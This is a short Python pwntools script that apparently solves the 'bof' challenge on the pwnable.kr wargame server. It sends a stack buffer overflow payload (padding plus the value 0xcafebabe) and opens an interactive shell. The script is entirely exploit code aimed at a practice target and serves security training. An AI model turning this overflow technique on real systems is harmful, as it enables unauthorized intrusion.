from pwn import *
context.log_level = 'debug'

p = remote('pwnable.kr', 9000)

payload = b"A" * 0x34 + p32(0xcafebabe)
p.recvuntil(b"me : ")
p.sendline(payload)
p.interactive()
